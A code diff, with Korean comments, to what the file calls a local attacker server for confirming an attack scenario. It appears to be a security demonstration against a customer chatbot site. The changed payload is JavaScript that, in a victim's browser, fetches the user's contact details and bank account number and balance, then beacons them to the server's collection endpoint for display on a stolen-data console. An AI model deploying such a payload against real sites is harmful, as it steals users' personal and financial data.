@@ -1,6 +1,6 @@
 """로컬 공격자 서버 (S2 확인용). 127.0.0.1에서만 실행하고, 받은 요청을 기록한다.
 
-- GET /x : S2 숨긴 코드가 불러가는 스크립트. 로그인한 사용자의 /api/me를 읽어 /c로 보낸다.
+- GET /x : S2 숨긴 코드가 불러가는 스크립트. 로그인한 사용자의 /api/me·/api/accounts/me를 읽어 /c로 보낸다.
 - GET /c?d=... : 빼돌린 값이 도착하는 곳.
 - GET / (또는 /console) : 탈취 데이터 콘솔 페이지 (고객 챗봇 화면 밖에서 따로 본다).
 - GET /log.json : 콘솔이 읽는 기록 JSON.
@@ -28,12 +28,18 @@ _lock = threading.Lock()
 
 
 def exfil_script(base: str) -> str:
-    # 브라우저(OFF 화면)에서 실행된다. httpOnly 쿠키는 못 읽지만, 같은 사이트의 /api/me는 쿠키와 함께 불러올 수 있다.
+    # 브라우저(OFF 화면)에서 실행된다. httpOnly 쿠키 자체는 못 읽지만, 세션 쿠키와 함께 같은 사이트의
+    # /api/me(연락처)와 /api/accounts/me(계좌번호·잔액)를 불러와 통째로 빼낸다.
+    # 비밀번호는 어떤 API로도 내려오지 않아(해시로만 저장) 이 방식으론 탈취되지 않는다.
     return (
-        "fetch(location.origin+'/api/me').then(r=>r.json()).then(d=>{"
-        f"new Image().src='{base}/c?d='+encodeURIComponent(JSON.stringify({{email:d.email,phone:d.phone}}));"
-        "});\n"
-    )
+        "Promise.all(["
+        "fetch(location.origin+'/api/me').then(r=>r.json()),"
+        "fetch(location.origin+'/api/accounts/me').then(r=>r.json())"
+        "]).then(function(a){var me=a[0],ac=a[1];"
+        "new Image().src='__BASE__/c?d='+encodeURIComponent(JSON.stringify("
+        "{name:me.name,email:me.email,phone:me.phone,account_no:ac.account_no,balance:ac.balance}"
+        "));});\n"
+    ).replace("__BASE__", base)
 
 
 def read_log(path: Path = LOG_FILE) -> list[dict[str, object]]:
@@ -73,7 +79,7 @@ class Handler(BaseHTTPRequestHandler):
 
     def do_GET(self) -> None:  # noqa: N802
         path = urlsplit(self.path).path
-        # 콘솔·로그 조회는 '공격'이 아니므로 기록하지 않는다.
+        # 콘솔·로그 조회, 브라우저 부수 요청(/favicon.ico 등)은 '공격'이 아니므로 기록하지 않는다.
         if path in ("/", "/console"):
             self._send(200, console_html("/log.json").encode(), "text/html; charset=utf-8")
             return
@@ -81,13 +87,17 @@ class Handler(BaseHTTPRequestHandler):
             body = json.dumps(read_log(self.log_file), ensure_ascii=False).encode()
             self._send(200, body, "application/json; charset=utf-8")
             return
-        # 이하 실제 공격 트래픽(/x 스크립트 요청, /c 수집)만 기록한다.
-        self._record()
-        if path == "/x":
+        if path == "/x":  # 피해자 브라우저가 불러가는 유출 스크립트
+            self._record()
             script = exfil_script(f"http://{HOST}:{self.server.server_address[1]}").encode()
             self._send(200, script, "text/javascript; charset=utf-8")
-        else:
+            return
+        if path == "/c":  # 빼돌린 데이터가 도착하는 수집 지점
+            self._record()
             self._send(204, b"", None)
+            return
+        # 그 외 경로(/favicon.ico 등)는 조용히 무시 — 기록하지 않는다.
+        self._send(204, b"", None)
 
     def log_message(self, format: str, *args: object) -> None:  # noqa: A002
         print(f"[attacker] {self.command} {self.path}")
